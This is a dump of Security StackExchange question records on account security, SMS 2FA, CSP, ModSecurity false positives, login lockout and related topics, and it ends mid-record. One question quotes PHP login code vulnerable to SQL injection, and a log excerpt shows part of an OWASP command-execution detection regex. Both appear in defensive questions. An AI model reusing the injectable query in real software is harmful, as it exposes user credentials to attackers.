"251369","1","","","2021-06-14 04:25:46","","2","2990","<p>If I use Google Authenticator for Coinbase, and someone sim-swaps my phone number and gains full access to my email account, can they drain my Coinbase account?</p>
<p>They would be in control of my email, sms, and phone calls.</p>
","259909","","235964","","2021-06-14 12:53:35","2021-06-14 12:53:35","Will Google Authenticator stop a sim-swap attack from compromising my Coinbase?","<account-security><multi-factor><smartphone><simcard>","2","0","","","","CC BY-SA 4.0"
"180450","1","182494","","2018-02-24 16:37:09","","7","11337","<p>In my Content Security Policy I have included <code>require-sri-for script</code>. However, in the Chrome console I get a notice (not an error, just info):</p>

<blockquote>
  <p>The Content-Security-Policy directive 'require-sri-for' is implemented behind a flag which is currently disabled.</p>
</blockquote>

<p>As far as I can interpret this, it's telling me that I am trying to require SRI for something that is disabled anyway. For example if I have: <code>script-src 'none'</code> then there would be no point in having <code>require-sri-for script</code>, as all script is disallowed anyway.</p>

<p>However, the notice still shows when I have <code>script-src 'self'</code>.</p>

<p>What is the proper meaning of this notice and what do I need to do to fix it?</p>
","136412","","136412","","2018-03-29 17:43:00","2018-03-29 17:43:00","Why does Chrome tell me that the CSP 'require-sri-for' directive is implemented behind a flag which is currently disabled?","<chrome><content-security-policy><sub-resource-integrity>","3","3","","","","CC BY-SA 3.0"
"180533","1","180537","","2018-02-26 11:51:41","","3","726","<p>According to <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-sri-for"" rel=""nofollow noreferrer"">Mozilla</a>:</p>

<blockquote>
  <p>The HTTP Content-Security-Policy <code>require-sri-for</code> directive instructs the client to require the use of Subresource Integrity for scripts or styles on the page.</p>
</blockquote>

<p>I fail to see the benefit. The SCP is designed to protect me from someone injecting scripts into my page. If an attacker is able to inject a script tag, wouldn't she also be able to inject an appropriate integrity attribute?</p>

<p>What attack is possible without this directive, but fails with it?</p>
","98538","","","","","2018-02-26 13:07:27","What does the CSP require-sri-for directive protect against?","<http><content-security-policy><sub-resource-integrity>","2","1","","","","CC BY-SA 3.0"
"112865","1","","","2016-02-05 03:57:11","","3","457","<p>I have two email accounts. My main one that I created a few years ago and switched to, which has a very strong/unique password that is not written down or stored anywhere. It also has 2-factor auth enabled. I have an older email account that I haven't used in years, but kept around since my Paypal account is linked to it. I forward all the emails from my old account to my new one.</p>

<p>A few days ago I received an email from Microsoft saying that there was a new access to my old email account. I reviewed the activity and after confirming that it was indeed not me, I immediately recovered the account, changed the password and added 2-factor auth for this one as well. <em>The email from Microsoft said that the account was locked down, and that access to my inbox, contacts and calendar was blocked until I verified it</em>.</p>

<p>This is an old account that I haven't used in years, there aren't any important accounts associated with it other than my Paypal account. I logged into Paypal, reviewed my details, history, nothing has changed, no payments have been made.</p>

<p>I changed my Paypal password, but since it was still the same one I presume that the attacker didn't try to recover it - the message from Microsoft said that my inbox was blocked as soon as he tried to login, if this is true then he wouldn't have been able to receive the password reset email at all.</p>

<p>What's my next step? I want to believe the Microsoft email and think that my inbox was locked and thus the attacker wasn't able to get anything out of my account, but a part of me doesn't want to take any chances. </p>

<p>I recently started using a password manager and changed a few dozens password on all the website I frequently use, and I use different passwords for my bank website, Paypal and my main email address - none of which are in the password manager.</p>

<p>Does anyone else have experience with a breached Microsoft account? Could the attacker do more damage than I think? Are there some things I need to watch for?</p>

<p>Any advice would be really appreciated.</p>
","99389","","","","","2018-01-30 07:24:22","How to secure/cleanup my accounts after having an old email account breached","<email><account-security>","2","0","0","","","CC BY-SA 3.0"
"251556","1","251583","","2021-06-20 15:28:13","","0","967","<p>The following search queries are blocked by ModSecurity and returns a 403 forbidden error:</p>
<p><code>www.example.com/s=zip+someword</code> &amp;
<code>www.example.com/s=gzip+someword</code></p>
<p>but not
<code>www.example.com/s=zip</code> &amp; <code>www.example.com/s=gzip</code></p>
<p>The Apache error_log:</p>
<pre><code>[Sun Jun 20 14:15:51.628805 2021] [:error] [pid 3764:tid 47658554889984] [client xxx.xxx.xxx.xxx:xxxx] [client xxx.xxx.xxx.xxx] ModSecurity: Warning. Pattern match &quot;(?:^|=)\\\\s*(?:{|\\\\s*\\\\(\\\\s*|\\\\w+=(?:[^\\\\s]*|\\\\$.*|\\\\$.*|&lt;.*|&gt;.*|\\\\'.*\\\\'|\\&quot;.*\\&quot;)\\\\s+|!\\\\s*|\\\\$)*\\\\s*(?:'|\\&quot;)*(?:[\\\\?\\\\*\\\\[\\\\]\\\\(\\\\)\\\\-\\\\|+\\\\w'\\&quot;\\\\./\\\\\\\\]+/)?[\\\\\\\\'\\&quot;]*(?:l[\\\\\\\\'\\&quot;]*(?:s(?:[\\\\\\\\'\\&quot;]*(?:b[\\\\\\\\'\\&quot;]*_[\\\\\\\\'\\&quot;]*r[\\\\\\\\'\\&quot;]*e[\\\\\\\\'\\&quot;]*l[\\\\\\\\' ...&quot; at ARGS:s. [file &quot;/etc/xxx/modsec_vendor_configs/OWASP3/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf&quot;] [line &quot;463&quot;] [id &quot;xxxxxx&quot;] [msg &quot;Remote Command Execution: Direct Unix Command Execution&quot;] [data &quot;Matched Data: zip  found within ARGS:s: zip someword&quot;] [severity &quot;CRITICAL&quot;] [ver &quot;OWASP_CRS/3.3.0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-shell&quot;] [tag &quot;platform-unix&quot;] [tag &quot;attack-rce&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/152/248/88&quot;] [tag &quot;PCI/6.5.2&quot;] [hostname &quot;example.com&quot;] [uri &quot;/&quot;] [unique_id &quot;xxxxxxx-xxxxxxxxxxxxxxxxxxx&quot;]
</code></pre>
<p>How do make an exception to this ruleset REQUEST-932-APPLICATION-ATTACK-RCE.conf to allow the above queries? I'm not RegEx savvy, and I don't know how to read it.</p>
","260186","","","","","2021-08-19 15:09:44","ModSecurity OWASP CRS 3.3.0 false positives on a Wordpress site","<owasp><mod-security>","1","2","","","","CC BY-SA 4.0"
"39892","1","39907","","2013-08-01 08:03:17","","1","211","<p>I have Unix systems (Solaris, Oracle,.Redhat etc.). I have to control all systems for security problem,bugs,patch,vulnerabilities.</p>

<p>I'm looking for security information for all security issues.</p>

<p>After that I'll update and check  all  Unix systems.
I need to take notification  for Unix systems or I need admin panel for manage system.
When I searched the web, I found this site: <code>securitytracker.com</code> which sends email notifications for vulnerabilities. Also I need report for latest vulnerabilities, patch and other systems.</p>

<p>Is there any commercial/free alternative to ^securitytracker.com`?</p>

<p>How can I manage this sytems for latest vulnerabilities? Is there any recommendation for this?</p>
","27356","","86652","","2016-07-01 01:41:29","2016-07-01 01:41:29","Notification or report for security problem of unix systems?","<exploit><known-vulnerabilities><unix><security-theater><patching>","1","0","","2013-08-01 14:30:48","","CC BY-SA 3.0"
"251636","1","251642","","2021-06-22 13:36:01","","2","142","<p>Imagine a webapp that uses a traditional email-password-login, with the users-table saving the password salted and hashed using bcrypt.<br />
Now a secondary login method should be implemented, like an API or external auth provider, with some users only being allowed to login via that secondary method, not the standard email-password-input.<br />
What are the security implications of populating the password field with an invalid hash, a string like 'NO-LOGIN', as to effectively disable the regular login? Would it be preferable to generate a random password and set a flag that disables the normal login for that user?</p>
","43086","","","","","2021-06-22 18:47:55","Security implications of using a non-hash in the password column","<passwords><hash><account-security>","1","3","","","","CC BY-SA 4.0"
"180772","1","","","2018-03-01 16:04:15","","4","849","<p>Several Q&amp;As here highlight the danger of phone hacking. For example, <a href=""https://security.stackexchange.com/questions/102428/why-do-web-services-keep-asking-me-about-my-phone-number"">this</a>.</p>

<p>In a nutshell, the solution is to NOT give your phone number, except to your bank or government.</p>

<p>Unfortunately, that is a very impractical solution for a simple reason: phones have been created first to communicate with people. 2FA came as a second thought. In other words, I need to give a phone number to many different companies that will absolutely make sure NOT to follow best security practices (my plumber, the school for my kids, etc.)</p>

<p>So I was wondering, what are the solutions to keep the convenience of being able to communicate with many different people, but stay safe?</p>

<p>I have thought about the following solutions:</p>

<p>1) Get a burner phone, with a different phone number. Give that new phone number to my bank and government services. My ""real phone"" is considered unsafe.</p>

<ul>
<li>Pros: seems safe</li>
<li>Cons: Impractical. The sim on the burner phone will deactivate after 3 months without usage. Do not want to carry 2 phone numbers, therefore will miss potentially important calls.</li>
</ul>

<p>To solve the cons, I looked into solutions to transfer calls/SMS from one safe phone number to my main (unsafe) phone number:</p>

<p>2) Get an app like Viber (Google voice is not an option outside of the US) that gives you a different (""alias"") phone number, and redirects it to my main phone number. Use the alias as my safe phone number (for banking).</p>

<ul>
<li>Pros: convenient, only 1 phone, do not miss call/messages</li>
<li>Cons: seems unsafe, as if a hacker hacks my real (unsafe) phone number, he can still receive the SMS sent to the alias, and therefore gain access to my bank. Also, I need to trust the provider. In many cases, they seem to be smallish companies, so hard for me to trust.</li>
</ul>

<p>3) Same setup, but my safe number is my real phone number. The alias is the unsafe one.</p>

<ul>
<li>Pros: seems to be the safest (but please let me know if I miss something)</li>
<li>Cons: I need to change my phone number, so that's highly inconvenient (I've obviously already shared it with many people)</li>
</ul>

<p>So my questions are the following:</p>

<ul>
<li>Are there flaws in my reasoning above?</li>
<li>Are there other (ideally better) solutions that I am missing?</li>
</ul>
","143641","","","","","2018-05-26 06:15:56","Phone number setup for security","<multi-factor><account-security><phone><smartphone>","4","3","","","","CC BY-SA 3.0"
"180864","1","180869","","2018-03-02 22:18:03","","0","555","<p>I know my website is being breached by a third-party web application under the following scenario:</p>

<ol>
<li><p>My users put credentials to my site into a third-party web application</p></li>
<li><p>The third-party web application violates my X-Frame Options Deny policy via a Google Chrome Extension.  It Iframes my website.</p></li>
<li><p>The third-party web application then logs into my website with the credentials the user gave it.</p></li>
<li><p>The third-party web application submits information to my website.</p></li>
</ol>

<p>Under this scenario, in my log files is there anyway for me to see what pages the third party application is visiting in my secure site and is there anyway to determine if this application is extracting information from my secure webpages? </p>

<p>Also any tips on how to block this third-party web application from being able to iframe my site is much appreciated.</p>

<p>Thanks for your input!</p>
","151232","","","","","2018-03-02 23:13:39","Website Security Breach from an Iframe","<account-security><iframe>","1","1","","","","CC BY-SA 3.0"
"180948","1","180998","","2018-03-04 18:27:01","","57","19288","<p>Backstory<br>
My sites and VPS were stolen from me. The hosting company and I were locked out and unable to access it. They weren't able to create a temp password for access because the attacker blocked it.
The last time I was logged into WHM, root control was taken and all HDDs were no longer bootable. I believe the same person used a worm to monitor my desktop remotely. 5 pcs and 5 mobile devices, bricking my ddwrt r7000 router with PIA VPN killswitched. A dozen or so mint/ubuntu vms were taken over. Many usb drives were made to be write-only.It was relentless. 
I stopped trying to figure out what was going on and reformatted all devices.</p>

<p>I am now waiting on the server image and a memory snapshot, as well as an rsync copy. Upon transaction ill get a fresh server image...certainly of a different IP, unless they aren't to be convinced.</p>

<p>Here is the email I received today:</p>

<blockquote>
  <p>Blockquote
  This ticket was just assigned to me.  I have made a backup of the account >out of the way of the backup processes here.</p>
</blockquote>

<p>[2018-03-25] pkgacct completed</p>

<p>I was reading over some of the conversations and would like to just make sure we are on the same page.</p>

<p>We can not dd ( bit for bit copy ) the current state because the account does not have a storage medium that can handle it.  If you wanted to add keys that we can rsync over ssh to a remote destination just give us the destination of the output file and we will be happy to help with that.</p>

<p>We normally do not keep hacked operating systems around unless there is some specific interest.  What I find interesting is the openVPN software:</p>

<p>uperior.hosting.com [home]# ifconfig
as0t0     Link encap:Ethernet  HWaddr
          inet6 addr: Scope:Link
          UP BROADCAST RUNNING PROMISC MULTICAST  MTU:1500  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:436367538 errors:0 dropped:504 overruns:0 carrier:0
          collisions:0 txqueuelen:200
          RX bytes:0 (0.0 b)  TX bytes:26310498062 (24.5 GiB)</p>

<p>asbr0     Link encap:Ethernet  HWaddr 
          inet addr:   Bcast:   Mask:
          inet6 addr:  Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:431222324 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1492069 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:20595591150 (19.1 GiB)  TX bytes:634373123 (604.9 MiB)</p>

<p>If you are using this server as a production WebServer I would recommend using CentOS 7 and installing something like 'Cockpit' instead of using a VPN through a cPanel server on CentOS 6.</p>

<p>What is in the scope of our support is to insure you have a path to and from the server while you salvage the barebones data.  I will conclude with some options and questions. (The following are my answers)</p>

<ol>
<li><p>An inquiry about the openvpn activitu</p></li>
<li><p>Letting them know, again, I want a copy of the server image, a memory snapshot, and all logs available</p></li>
<li><p>Fresh installation of cPanel/WHM</p></li>
<li><p>Fresh IPs for sites and VPS</p></li>
<li><p>SFTP info</p></li>
</ol>

<blockquote>
  <p>Blockquote</p>
  
  <p>Is having a VPN, IDS, firewall, honeypot enough? 
  Have I left anything out?</p>
</blockquote>

<p>VPS is a from Bluehost, running CentOS 7 with any alternative to WordPress...</p>
","172063","","172063","","2018-04-10 09:31:12","2018-06-22 03:43:32","Brutalized VPS recovery data now available. Considerations?","<webserver><account-security><incident-response><account-lockout><vps>","8","16","","2018-03-07 22:17:46","","CC BY-SA 3.0"
"40150","1","","","2013-08-06 14:38:20","","-1","316","<p>Is there an Information Security Management System (ISMS) existing for SME/ SMB, if not why ?</p>

<p>The so called GRC suites are mainly targeted towards Fortune 100 (may be up to fortune 1000) companies , considering the high cost, maintenance, TCO part of it. They'll be the only ones who'll have sufficient security budgets and roles like CISO to afford and run such programs (solutions) effectively.</p>
","29172","","","","","2013-08-06 20:24:23","ISMS for SMB (Small And Medium Enterprise)?","<audit><corporate-policy><monitoring><security-theater>","2","0","","2013-08-06 23:11:12","","CC BY-SA 3.0"
"252076","1","252077","","2021-07-06 10:59:52","","88","21448","<p>I did some research about how secure and private SMS messages are.</p>
<p>Providers and governments can see these SMS messages in plaintext,<br />
but what is weird is that these messages are not encrypted in transit.</p>
<p>According to my knowledge, that makes the service vulnerable to MiTM attacks: a semi-skilled hacker who knows my location can intercept the connection and get a code to reset my Google account's password for example.</p>
","260902","","61948","","2021-07-09 11:47:23","2023-03-14 23:52:43","Why is SMS used as a way of verifying a user's mobile, when it is not even encrypted in transit?","<encryption><man-in-the-middle><account-security><multi-factor><sms>","7","10","","","","CC BY-SA 4.0"
"181240","1","181244","","2018-03-09 22:30:50","","0","449","<p>It is a common recommendation to return ""Username or password is incorrect"" instead of ""Username does not exist"" when the given username does not exist and ""Password is incorrect"" when username exists but password is wrong.</p>

<p>The generally cited reason is that you don't want to provide an attacker with the knowledge that a username exists, to prevent online brute force attacks.</p>

<p>However, if username is used to login, it has to be unique, and therefore you will need to inform the user that a chosen username is taken while they are creating an account. So an attacker can easily determine if a username exists even if you only say ""Username or password is incorrect"" when logging in.</p>

<p>But even if no signup page exists, or other measures are taken to obscure the existence of usernames on registration, this recommendation still doesn't make sense. Usernames are not designed to be secret. Most people reuse usernames, and they are easy to find. And keeping them secret only improves security so far as it increases the total size of your secret, which can be achieved with longer required passwords.</p>

<p>And moreover, there are better ways to prevent online brute force attacks than longer secrets. Rate limiting users on login, which a properly slow password hashing algorithm like bcrypt already implicitly does, or providing a timeout after many incorrect attempts, solves this problem far better than a longer secret does.</p>

<p>Is there something else I'm missing? Even on this site I see people defending this practice, but I have yet to see a reason that isn't better solved with other methods.</p>

<p>Edit: As a follow-up, if this recommendation really isn't useful, why is it still common? And where did it come from?</p>
","172365","","172365","","2018-03-09 22:43:58","2018-03-10 08:30:41","Is the common recommendation to obscure the existance of a username on login just security theater?","<authentication><security-theater><user-enumeration>","2","12","","2018-03-13 22:22:02","","CC BY-SA 3.0"
"181304","1","181345","","2018-03-11 11:34:18","","-1","1947","<p>How do headphones work? Do they contain any firmware or any instruction set? Are they vulnerable to anything? Good old wired analog Jack ones, not USB wired, wireless, Bluetooth which have lot of fundamental flaws in design... </p>
","165850","","165850","","2018-03-12 06:12:04","2022-04-02 22:02:17","How do headphones work? Do they contain firmware?","<vulnerability><hardware><firmware><security-by-design>","3","3","","2018-03-12 06:33:16","","CC BY-SA 3.0"
"252237","1","252238","","2021-07-10 18:04:51","","0","143","<p>I am designing a login system for my React app.</p>
<p>All user data must be protected in case of a db leak. I only store encrypted data, with the exception of the email.</p>
<p>To encrypt I need a key and I don't have a place to store keys and storing them in the db would be dumb. So I'm making keys out of the user's email and password. If the user provides the same email and password, the same key will be generated.</p>
<p>Should I even be encrypting the data? I'm storing things like addresses, phone numbers, and some company ID numbers.</p>
","261120","","261120","","2021-07-11 12:50:05","2021-07-11 12:50:05","Am I writing a good login system?","<databases><account-security><session-management>","1","2","","2021-07-10 19:39:29","","CC BY-SA 4.0"
"114682","1","","","2016-02-15 12:16:30","","1","88","<p>NSM model from sans.org is vendor neutral,that's good, but I need more detail and complexity model. Don't want to invent a bicycle and looking for complete solution in this field.Looking not for blog article or ""startup-theory"" , but for good designed document with good segments and theme coverage and life-cycle(is a must ).</p>
","101307","","101307","","2016-02-15 12:31:48","2016-02-15 12:31:48","Informational security model models and life-cycle","<threat-modeling><content-security-policy>","0","1","","","","CC BY-SA 3.0"
"181374","1","","","2018-03-12 14:02:05","","-1","191","<p>In recent years there have been a number of spectacularly huge hacks. As examples:</p>

<ul>
<li>The 2013-14 hack of Yahoo involving 3 billion accounts</li>
<li>The 2016 hack of Adult Friend Finder involving 400+ million accounts. </li>
<li>The 2014 hack of eBay involving 140+ million accounts.</li>
</ul>

<p>In the last few months a repository of <a href=""https://thehackernews.com/2017/12/data-breach-password-list.html"" rel=""nofollow noreferrer"">1.4 billion plain text passwords</a> was found on the net.</p>

<p>I have two questions:</p>

<ul>
<li>What could most easily be changed that could have made these hacks much harder? </li>
<li>What could most easily be changed that would make credential stealing less worthwhile? For example, if we all stopped using usernames and passwords to log into systems?</li>
</ul>
","172721","","172721","","2018-03-12 15:09:24","2018-03-12 15:09:24","Is there a single change that could have made the biggest password hacks much harder?","<passwords><account-security>","2","2","","","","CC BY-SA 3.0"
"115038","1","","","2016-02-18 17:25:56","","1","211","<p>When account A has logged into computer A, and then account A starts to log in to computer B, account A in computer A will automatically be logged out. May I know what are the possible reasons in why this feature should be implemented? How does it make it more secure?</p>
","","user101736","","","","2016-02-18 18:28:32","Security reasons for kicking user when logged in from two places","<logging><account-security>","2","0","","","","CC BY-SA 3.0"
"181663","1","181664","","2018-03-16 02:28:38","","-1","125","<p>This is my php code:</p>

<pre><code>$uname = $_POST['username'];
$pwd = md5($_POST['password']);
$sql = ""SELECT * FROM `user` WHERE username = '$uname' AND password = '$pwd'""; 
</code></pre>

<p>My friend gave me this code but I’d like to know if this is secure.</p>
","173080","","103021","","2018-03-16 02:44:49","2018-03-16 02:44:49","Can this be bypassed with SQL Injection?","<authentication><php><sql-injection><mysql><account-security>","1","0","","","","CC BY-SA 3.0"
"181697","1","","","2018-03-16 13:29:57","","4","7511","<p>I have almost finished developing my login system and there is one more thing that I'm not sure about. So many debates I found on the internet about counting invalid logins and locking users account. My system stores user names and passwords (that are salted[for each user different salt] and hashed) in database. If user enters invalid user name or password I keep track of their Username, Password, LoginTime, SessionID, IP and Browser. Here is example:</p>

<pre><code>LoginID   LoginTime                 LoginUN    LoginPW    LoginSessionID    LoginIP     LoginBrowser    
   1    2018-03-15 13:40:25.000     jpapis     test       E72E.cfusion      10.18.1.37  Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
  98    2018-03-15 13:48:45.000     mhart      mypass55   E72E.cfusion      10.12.1.87  Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
  32    2018-03-15 14:29:14.000     skatre     1167mmB!   378E.cfusion    10.36.1.17    Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
</code></pre>

<p>I'm wondering if I should lock account after X attempts? If so what would be the best practice to do that? Here is one approach that I found:</p>

<pre><code>SELECT COUNT(LoginID) AS countID, DATEDIFF(mi,LoginTime,GETDATE ( )) AS TimeElapsed
FROM FailedLogins
WHERE (LoginUN = '#username#' OR LoginSessionID = '#SESSION.sessionid#' OR LoginIP = '#REMOTE_ADDR#')
    AND DATEDIFF(mi,LoginTime,GETDATE ( )) &lt;= 60
GROUP BY LoginID, LoginTime
HAVING COUNT(LoginID) &gt;= 5;
</code></pre>

<p>Query above will look for username, sessionID or IP address. If either of these it's found in FailedLogin table within 60min and it's greater than 5 I would lock the account. Only problem here is I'm not sure what this would prevent, brute force attack can send way too many attempts in 60min so I'm not sure what would be the benefit of checking failed logins this way. Is there better way to handle failed logins now days? Should I even lock the account? If anyone can provide some thoughts and examples please let me know. Also I want to share some details about the system. We do not have any money transaction in the system or tied to user accounts. We do have sensitive information in the system and that's why I would like to implement security feature to prevent hackers of trying to break password with some of hacker techniques. Thank you.</p>
","173115","","","","","2018-03-16 14:22:51","Should user account be locked after X amount of failed logins?","<authentication><passwords><brute-force><account-security><account-lockout>","1","1","","","","CC BY-SA 3.0"
"115151","1","115152","","2016-02-19 11:55:23","","0","155","<p>Some of my workmates are developing a video player using Javascript. AFAIK, we are not going to have any website. The clients will connect to the server, download the javascript code and then render the player in their site.</p>

<p>In this context, does it make sense to use CSP in our code? Is it even possible? All the examples I see are focused in how to use CSP for protecting a website against XSS.</p>
","","user15194","","","","2016-02-19 12:05:19","Is it possible to use CSP for a Javascript-based video player?","<xss><javascript><content-security-policy>","1","0","","","","CC BY-SA 3.0"
"253890","1","","","2021-08-02 12:41:21","","1","377","<p>I am calling my bank via mobile phone (in Germany) and the electronic voice asks me to</p>
<ul>
<li>type in my account access id (via the number pad), and like-wise,</li>
<li>type in my account PIN, <strong>all</strong> the numbers, not only the first and third, but all six of them!</li>
</ul>
<p>If I do not do all of this, the call will be cancelled, even if my inquiry is not account specific.</p>
<p>Given that every bank always tells you to <em>never ever</em> give away your account login information (especially the PIN, with phrases like &quot;we will never ask you for your PIN&quot;), and a usual phone call is not heavily encrypted (I believe), this appeared <em>very</em> troublesome to me!</p>
<p>Is this normal?
How can this be justified?
Is there any good reason <em>not</em> to worry about this?
How are they ensuring that this not leaks my account login details.</p>
","264147","","","","","2021-08-03 08:09:16","Is it normal/safe/justifiable that a bank asks me for my full login details (account id and PIN) when calling via mobile phone?","<authentication><account-security><phone><banks>","2","11","","","","CC BY-SA 4.0"
"181926","1","","","2018-03-20 14:54:50","","2","117","<p>A few months ago, I downloaded Edenwaith Permanent Eraser from the edenwaith website and set it to DoE (3x) in the preferences.</p>

<p>I am using Mac Mini 2011, MacOS Sierra, and use it to delete files and folders via a Finder plug-in.</p>

<p>7-pass would probably be overkill unless it was really sensitive data, but is 3x good?</p>

<p>I have other questions:</p>

<p>How likely is it that a file or folder deleted under DoE 3-pass could be recovered?</p>

<p>When would it make sense to use 7-pass or 35-pass for a file or folder?</p>

<p>Is this a sensible measure to take so far for deletion of data?</p>

<p>I would much appreciate any advice.</p>
","173440","","","","","2018-03-20 16:10:54","Erasing files and passes - how to understand them?","<account-security><deletion><file-access>","1","3","","2018-03-22 08:37:28","","CC BY-SA 3.0"
"137882","1","","","2016-09-26 14:02:08","","1","101","<p>A bit of help on this one if anyonce can, Outlook account (on exchange) seems to have been compromised, however in an automated spam kind of way, a rule is set up on the account to move items from inbox to deleted items, email is sent from the account to other accounts including itself.</p>

<p>An email was recieved into one account with a scam weblink, a user did submit their details however does not result in manual activity more automated.</p>

<p>Any ideas.</p>

<p>Luke</p>
","121680","","","","","2016-11-26 00:11:55","Exchange - Email Account Compromise","<account-security>","1","0","","","","CC BY-SA 3.0"
"204768","1","","","2019-03-05 14:50:48","","1","314","<p>I am working on a platform that does temp labor and we are needing to run background checks. That means collecting scary data like SSNs, Names, Addresses, Dates Of Birth, and sending them to the background check service that we are using. They require all API calls to include basic credentials. (A username and password)</p>

<p>I can basically see two options:</p>

<ol>
<li><p>Make the call to the background check API from the browser...but that puts those API credentials IN the browser....not good at all. Somebody could go through our completed background checks. Lots of sensitive info there! (This is fairly unlikely...but possible nonetheless)</p></li>
<li><p>Send the information to my server, which will pass it on to the background check API....but that means a SSN is on my server for a brief amount of time. (Barring any logging that I'd need to unhook)</p></li>
</ol>

<p>I am leaning towards the latter, especially since I've been told a mobile app will be in the future. That begs the main question: <strong>What is the correct way to treat a SSN that is simply passing through a server on its way somewhere else?</strong></p>
","166580","","166580","","2019-03-05 16:19:46","2019-03-05 16:19:46","How to treat SSN passing through web server","<web-application><webserver><sensitive-data-exposure><social-security-number>","0","4","","","","CC BY-SA 4.0"
"204879","1","206294","","2019-03-06 18:45:49","","1","5057","<p>Every one hour or so I have this event in my <code>Event viewer -&gt; Windows logs -&gt; Security</code> log.</p>

<p>I understand the <code>consent.exe</code> is Windows' UAC control, what i wan't to know is why and what is trying to log into my administrator account every 30 min / every 1h.</p>

<p>The detail of the log is (I have a bunch of these btw.):</p>

<pre><code>An account failed to log on.

Subject:
    Security ID:        SYSTEM
    Account Name:       DESKTOP-8P22P26$
    Account Domain:     WORKGROUP
    Logon ID:       0x3E7

Logon Type:         2

Account For Which Logon Failed:
    Security ID:        NULL SID
    Account Name:       Admin
    Account Domain:     DESKTOP-8P22P26

Failure Information:
    Failure Reason:     Unknown user name or bad password.
    Status:         0xC000006D
    Sub Status:     0xC000006A

Process Information:
    Caller Process ID:  0x2260
    Caller Process Name:    C:\Windows\System32\consent.exe

Network Information:
    Workstation Name:   DESKTOP-8P22P26
    Source Network Address: ::1
    Source Port:        0

Detailed Authentication Information:
    Logon Process:      CredPro
    Authentication Package: Negotiate
    Transited Services: -
    Package Name (NTLM only):   -
    Key Length:     0
</code></pre>
","","user200906","","","","2019-03-28 10:16:20","Windows event log - Security - Audit failure","<audit><account-security>","1","1","","","","CC BY-SA 4.0"
"205009","1","205014","","2019-03-08 08:51:56","","52","12255","<p>I'm working on integrating a payment system with paypal in C#, and I installed the official paypal nuget package. Then I went to <a href=""https://github.com/paypal/PayPal-NET-SDK"" rel=""noreferrer"">the paypal github site</a>.</p>

<p>And linked to <a href=""http://paypal.github.io/PayPal-NET-SDK/Samples/PaymentWithPayPal.aspx.html"" rel=""noreferrer"">this below site (SDK Reference)</a>.</p>

<p>At this point both Chrome and Firefox warned me about </p>

<p><code>Deceptive Site Ahead</code></p>

<p>Is this site really dangerous?</p>

<p>URL's are listed here so that people don't need to click on potentially dangerous links:</p>

<pre><code>https://github.com/paypal/PayPal-NET-SDK
http://paypal.github.io/PayPal-NET-SDK/Samples/PaymentWithPayPal.aspx.html
</code></pre>
","79965","","79965","","2019-03-08 09:05:28","2019-03-20 10:39:32","Is this Paypal Github SDK reference really a dangerous site?","<web-browser><credit-card><account-security>","2","2","","","","CC BY-SA 4.0"
"205022","1","","","2019-03-08 14:15:05","","2","130","<p>What is the best way to prepare your laptop and smartphone for travel?</p>

<p>I envision having an encrypted back up stored at home; then factory resetting the smartphones/laptops for travel and installing only the bare necessities. <em>If</em> any particular toolkit/app is needed beyond the border, then FedEx it to your destination ahead of time on encrypted storage. </p>

<p>What are best practices for Apple devices for travel? Say a laptop and a phone. </p>

<p>I ask this both ways: (1) personal security, for e.g. my Apple pay or banking details should not be at risk beyond the US, (2) CBP now has rights to electronic device seizure and owners are legally obligated to provide passwords for access which I find too invasive. </p>

<p>I wanted to ask this on Travel.SE but I figured it would be voted off topic. I think this is the best site, because physical access to my devices without my approval constitutes both data as well as account security concerns. </p>

<p><strong>Note:</strong> This is <strong>not</strong> just about laptop or smartphone being <em>stolen</em>, in which case just encrypting the devices would be sufficient, this is also about governments/entities (including our own) demanding invasive access to your personal devices. Best practice would be to have a dedicated travel laptop and phone, but barring that, what is the best option?</p>
","201441","","","","","2019-03-08 14:15:05","Wiping a smartphone/laptop for travel purposes","<disk-encryption><account-security>","0","2","","","","CC BY-SA 4.0"
"205023","1","","","2019-03-08 14:18:10","","1","462","<p>Using react-native, we save the <code>first name</code> and <code>last name</code> in Redux, which is a non-encrypted database within the app.</p>

<p>I have been tasked to secure this data. Either encrypt these two fields or save them in the storage of the phone.</p>

<p>How risky is to have the first name and last name saved in clear. Is it a security risk?</p>
","175068","","","","","2019-03-09 00:48:38","Saving unhashed first name and last name on a non-encrypted database on phone","<encryption><account-security>","2","2","","","","CC BY-SA 4.0"
"205027","1","","","2019-03-08 15:42:54","","6","464","<p>So I took over as senior IT manager at a small company a couple months ago. Up to now, there was no ""IT department"" as such, just another guy who ""did computers"". To this point: things are running off a Windows workgroup with no users, everything is on a single LAN subnet (no DMZ, no WiFi controls, no VoIP priority), and the ""file server"" and ""backup"" were Win7 machines, one of which had a RAID card in it and the whole thing worked over broadcast WINS.</p>

<p>Since taking over, I have set up a real fileserver, some basic network segmentation, VoIP forwarding and other basic stuff. Users seem happy phones sound better and their files are backed up and served faster. Now comes the hard part.</p>

<p>I have set up a domain controller (and SDC), and silently migrated everyone to using DNS resolution for internal lookup - now I'm at the step of getting them all on the domain. The benefits seem obvious to me (centralized control, user management, etc.).  I have set up a couple of ""shared"" desktops and showed users how to log in, but gotten some pushback about it being harder/different than it used to be (it used to be that there was one Windows admin account with auto-login. Anyone who wanted to use any computer just sat down. No mind if someone else is logged into their email or clearly doing something). When ask WHY I am doing this, I have given the following answers and gotten the following responses:</p>

<ul>
<li>What if you don't have a password on your computer? Someone could just send a nasty email from your account

<blockquote>
  <p>Why would someone do that?</p>
</blockquote></li>
<li>Do you want someone messing with all your settings?

<blockquote>
  <p>I don't have a password now and no one does that</p>
</blockquote></li>
<li>I need to know who you are so I know you are supposed to have access to these files

<blockquote>
  <p>I work here, of course I'm supposed to have access!</p>
</blockquote></li>
<li>If I do this, then it becomes my fault if we get a virus and you get to blame me

<blockquote>
  <ul>
